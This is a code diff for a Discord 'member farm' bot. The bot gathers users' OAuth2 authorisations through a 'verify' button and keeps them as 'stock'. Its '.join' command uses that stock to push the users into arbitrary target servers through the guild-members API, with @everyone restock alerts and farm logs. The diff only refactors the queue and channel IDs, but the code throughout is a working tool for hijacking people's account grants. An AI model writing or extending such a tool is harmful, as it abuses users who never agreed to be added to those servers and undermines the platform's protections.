@@ -16,9 +16,16 @@ let currentPrefix = '.';
 let discordClient = null;
 
 // Queue & Status Management
-let activeJoinTask = null; // Stores current join running info
-const joinQueue = [];      // Stores queued join requests
-let statusMessageRef = null; // Stores reference to auto-updating message
+let activeJoinTask = null; 
+let statusMessageRef = null; 
+
+// Channels Configuration
+const CHANNELS = {
+    AUTORESTOCK: '1563253480553054358',
+    FARM_LOG: '1563253450693808210',
+    BOT_COMMANDS_AND_VERIF: '1563253453520642140',
+    AUTO_DELETE: '1561453220633518181'
+};
 
 // Homepage and OAuth Callback handler
 app.get('/', async (req, res) => {
@@ -78,37 +85,35 @@ app.get('/', async (req, res) => {
             });
 
             restockCounter++;
-            console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} \vert{} Progress to alert:${restockCounter}/30`);
+            console.log(`[AUTORESTOCK] New account verified (${userData.username})! Total Stock: ${tokenDatabase.length} | Progress to alert: ${restockCounter}/30`);
 
-            // Send log to log channel
-            const logChannelId = process.env.LOG_CHANNEL_ID || '1561453902270955630';
+            // Send verification log to channel 1563253453520642140
             if (discordClient) {
                 try {
-                    const logChannel = await discordClient.channels.fetch(logChannelId);
-                    if (logChannel) {
+                    const verifLogChannel = await discordClient.channels.fetch(CHANNELS.BOT_COMMANDS_AND_VERIF);
+                    if (verifLogChannel) {
                         const logEmbed = new EmbedBuilder()
                             .setTitle('⚡ New User Verified')
                             .setDescription(`User **${userData.username}** (\`${userData.id}\`) verified successfully!\n\n**Total Available Stock:** \`${tokenDatabase.length}\``)
                             .setColor(0x00FF00)
                             .setTimestamp();
 
-                        await logChannel.send({ embeds: [logEmbed] });
+                        await verifLogChannel.send({ embeds: [logEmbed] });
                     }
                 } catch (logErr) {
                     console.error('[LOG ERROR] Failed to send verification log:', logErr);
                 }
             }
 
-            // 30-person restock trigger
+            // 30-person restock trigger targeting channel 1563253480553054358
             if (autoRestockEnabled && restockCounter >= 30) {
                 restockCounter = 0; 
 
                 if (discordClient) {
                     try {
-                        const targetChannelId = '1561453902270955630';
-                        const announcementChannel = await discordClient.channels.fetch(targetChannelId);
+                        const restockChannel = await discordClient.channels.fetch(CHANNELS.AUTORESTOCK);
                         
-                        if (announcementChannel) {
+                        if (restockChannel) {
                             const restockEmbed = new EmbedBuilder()
                                 .setTitle('RESTOCK!')
                                 .setDescription(
@@ -123,7 +128,7 @@ app.get('/', async (req, res) => {
                                 .setColor(0x00FF00)
                                 .setTimestamp();
 
-                            const sentMessage = await announcementChannel.send({ content: '@everyone', embeds: [restockEmbed] });
+                            const sentMessage = await restockChannel.send({ content: '@everyone', embeds: [restockEmbed] });
                             await sentMessage.react('☑️');
                         }
                     } catch (announcementErr) {
@@ -177,7 +182,7 @@ const client = new Client({
 
 discordClient = client;
 
-// Auto-Update Status Embed Every 15 Seconds
+// Auto-Update Status Embed Every 15 Seconds (for `.status channel`)
 setInterval(async () => {
     if (!statusMessageRef) return;
 
@@ -186,16 +191,12 @@ setInterval(async () => {
             ? `Adding members to \`${activeJoinTask.targetGuildId}\` (${activeJoinTask.progress}/${activeJoinTask.total})`
             : 'Nothing running';
 
-        const queueText = joinQueue.length > 0 
-            ? joinQueue.map((item, index) => `${index + 1}. Guild \`${item.targetGuildId}\` (${item.tokensToUse.length} members)`).join('\n')
-            : 'Empty';
-
         const statusEmbed = new EmbedBuilder()
             .setTitle('DJoin Status')
             .setColor(0x5865F2)
             .addFields(
                 { name: 'Currently Running', value: currentlyRunningText },
-                { name: 'Queue', value: queueText }
+                { name: 'Queue', value: 'Empty' }
             )
             .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });
 
@@ -210,8 +211,8 @@ client.once('ready', () => {
 });
 
 client.on('messageCreate', async message => {
-    // Auto-Delete Messages in specific channel (ID: 1561453220633518181)
-    if (message.channel.id === '1561453220633518181') {
+    // Auto-Delete Messages in specific channel
+    if (message.channel.id === CHANNELS.AUTO_DELETE) {
         setTimeout(async () => {
             try {
                 if (message.deletable) await message.delete();
@@ -233,15 +234,15 @@ client.on('messageCreate', async message => {
             .addFields(
                 { 
                     name: '⚙️ Core & Verification', 
-                    value: `\`${currentPrefix}verify\` - Generates the OAuth2 verification button\n\`${currentPrefix}stock\` - Views total active accounts in database\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Views bot status or sets live status panel` 
+                    value: `\`${currentPrefix}verify\` - Generates OAuth2 verify button\n\`${currentPrefix}stock\` - Views total active accounts\n\`${currentPrefix}join <serverID>\` - Requests members to join target server\n\`${currentPrefix}bot\` - Bot invite button\n\`${currentPrefix}status\` - Bot operational status` 
                 },
                 { 
                     name: '🛠️ Config & Management', 
-                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles automatic restock alerts\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
+                    value: `\`${currentPrefix}autorestock enable|disable\` - Toggles auto-restocks\n\`${currentPrefix}prefix set <prefix>\` - Changes command prefix\n\`${currentPrefix}restock <n>\` - Manually adds restock slots\n\`${currentPrefix}remove <n>\` - Removes accounts from stock` 
                 },
                 { 
-                    name: '🛡️ Queue, Logs & Admin', 
-                    value: `\`${currentPrefix}queue clear\` - Clears active execution queue\n\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
+                    name: '🛡️ Admin & Control', 
+                    value: `\`${currentPrefix}maintenance enable|disable\` - Toggles maintenance mode\n\`${currentPrefix}blacklist <id> <reason>\` - Blacklists users or servers` 
                 }
             )
             .setFooter({ text: 'Member Farm Utility' });
@@ -297,13 +298,18 @@ client.on('messageCreate', async message => {
                 .setColor(0x5865F2)
                 .addFields(
                     { name: 'Currently Running', value: activeJoinTask ? `Adding to \`${activeJoinTask.targetGuildId}\`` : 'Nothing running' },
-                    { name: 'Queue', value: joinQueue.length > 0 ? `${joinQueue.length} items in queue` : 'Empty' }
+                    { name: 'Queue', value: 'Empty' }
                 )
                 .setFooter({ text: `Auto-updates every 15s | Today at ${new Date().toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' })}` });
 
             statusMessageRef = await message.channel.send({ embeds: [statusEmbed] });
             return;
         }
+
+        const uptimeSeconds = Math.floor(client.uptime / 1000);
+        const hours = Math.floor(uptimeSeconds / 3600);
+        const minutes = Math.floor((uptimeSeconds % 3600) / 60);
+        const seconds = uptimeSeconds % 60;
 
         const statusEmbed = new EmbedBuilder()
             .setTitle('🟢 AutoFarm Bot Status')
@@ -312,23 +318,15 @@ client.on('messageCreate', async message => {
                 { name: '📊 Active Stock Pool', value: `\`${tokenDatabase.length}\` accounts`, inline: true },
                 { name: '🔄 Auto-Restock', value: autoRestockEnabled ? '`Enabled`' : '`Disabled`', inline: true },
                 { name: '🛠️ Maintenance', value: maintenanceMode ? '`Enabled`' : '`Disabled`', inline: true },
-                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true }
+                { name: '🌐 Connected Servers', value: `\`${client.guilds.cache.size}\` servers`, inline: true },
+                { name: '⏱️ Uptime', value: `\`${hours}h ${minutes}m ${seconds}s\``, inline: true }
             )
             .setTimestamp();
 
         return message.reply({ embeds: [statusEmbed] });
     }
 
-    // 6. .queue command
-    if (command === 'queue') {
-        if (args[0] === 'clear') {
-            joinQueue.length = 0;
-            return message.reply('✅ Execution queue has been cleared.');
-        }
-        return message.reply(`📋 **Queue Status:** \`${joinQueue.length}\` task(s) currently waiting.`);
-    }
-
-    // 7. .maintenance command
+    // 6. .maintenance command
     if (command === 'maintenance') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions.');
@@ -345,7 +343,7 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // 8. .autorestock <enable|disable> Command
+    // 7. .autorestock <enable|disable> Command
     if (command === 'autorestock') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions to change autorestock settings.');
@@ -363,7 +361,7 @@ client.on('messageCreate', async message => {
         }
     }
 
-    // 9. .restock <n> Command
+    // 8. .restock <n> Command
     if (command === 'restock') {
         const amount = parseInt(args[0]);
         if (isNaN(amount)) return message.reply(`Usage: \`${currentPrefix}restock <amount>\``);
@@ -371,14 +369,14 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Successfully restocked **${amount}** accounts manually. Total stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 10. .remove <n> Command
+    // 9. .remove <n> Command
     if (command === 'remove') {
         const amount = parseInt(args[0]) || 1;
         tokenDatabase.splice(0, amount);
         return message.reply(`🗑️ Removed **${amount}** accounts from stock. Current stock: \`${tokenDatabase.length}\`.`);
     }
 
-    // 11. .prefix set <prefix> Command
+    // 10. .prefix set <prefix> Command
     if (command === 'prefix' && args[0] === 'set') {
         if (!message.member.permissions.has(PermissionsBitField.Flags.Administrator)) {
             return message.reply('❌ You need Administrator permissions to change the prefix.');
@@ -388,7 +386,7 @@ client.on('messageCreate', async message => {
         return message.reply(`✅ Bot prefix updated to: \`${currentPrefix}\``);
     }
 
-    // 12. .join <Server ID> Command
+    // 11. .join <Server ID> Command
     if (command === 'join') {
         if (maintenanceMode) {
             return message.reply('🛠️ Bot is currently under maintenance. Please try again later.');
@@ -431,39 +429,15 @@ client.on('messageCreate', async message => {
             message.channel.send(`⚠️ Role tier restriction applied: Maximum **${limit}** account(s) allowed per join.`);
         }
 
-        // Add task to queue and process
-        const joinTask = { targetGuildId, tokensToUse, channel: message.channel };
-        joinQueue.push(joinTask);
-
-        if (!activeJoinTask) {
-            processQueue();
-        } else {
-            message.reply(`📥 Request added to queue! Position in queue: **${joinQueue.length}**`);
-        }
-    }
-
-    // Helper Function to process join queue iteratively
-    async function processQueue() {
-        if (joinQueue.length === 0) {
-            activeJoinTask = null;
-            return;
-        }
-
-        const currentJob = joinQueue.shift();
-        activeJoinTask = {
-            targetGuildId: currentJob.targetGuildId,
-            total: currentJob.tokensToUse.length,
-            progress: 0
-        };
-
-        await currentJob.channel.send(`AutoFarm attempting to add ${currentJob.tokensToUse.length} accounts to server ID \`${currentJob.targetGuildId}\`...`);
+        activeJoinTask = { targetGuildId, total: tokensToUse.length, progress: 0 };
+        await message.reply(`AutoFarm attempting to add ${tokensToUse.length} accounts to server ID \`${targetGuildId}\`...`);
 
         let successCount = 0;
-        for (const tokenData of currentJob.tokensToUse) {
+        for (const tokenData of tokensToUse) {
             activeJoinTask.progress++;
             if (tokenData.mock) continue; 
             try {
-                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${currentJob.targetGuildId}/members/${tokenData.user_id}`, {
+                const joinRes = await fetch(`https://discord.com/api/v10/guilds/${targetGuildId}/members/${tokenData.user_id}`, {
                     method: 'PUT',
                     headers: {
                         Authorization: `Bot ${process.env.DISCORD_TOKEN}`,
@@ -480,19 +454,28 @@ client.on('messageCreate', async message => {
             }
         }
 
-        await currentJob.channel.send(`AutoFarm successfully added **${successCount}** out of **${currentJob.tokensToUse.length}** accounts to the server.`);
-        
         activeJoinTask = null;
-        processQueue(); // Process next item in queue
+
+        // Send farm log to channel 1563253450693808210
+        try {
+            const farmLogChannel = await client.channels.fetch(CHANNELS.FARM_LOG);
+            if (farmLogChannel) {
+                farmLogChannel.send(`📊 **Farm Execution Complete:** Added **${successCount}** out of **${tokensToUse.length}** accounts to server \`${targetGuildId}\`. Triggered by <@${message.author.id}>.`);
+            }
+        } catch (e) {
+            console.error('Failed to send farm log:', e);
+        }
+
+        return message.channel.send(`AutoFarm successfully added **${successCount}** out of **${tokensToUse.length}** accounts to the server.`);
     }
 
-    // 13. Generic Panel Command Responses
+    // 12. Generic Panel Command Responses
     const panelCommands = [
         'channel', 'checkauth', 'checkserver', 'panel',
         'basesend', 'send', 'verifyrole', 'cooldown', 'bio', 'color',
         'stats', 'profile', 'banfarm', 'antiraid',
         'logfarm', 'logserver', 'logerrors', 'logadmin', 'logs', 'log',
-        'blacklist', 'leave', 'antileave', 'announce', 'invites'
+        'blacklist', 'leave', 'antileave', 'announce', 'invites', 'queue'
     ];
 
     if (panelCommands.includes(command)) {
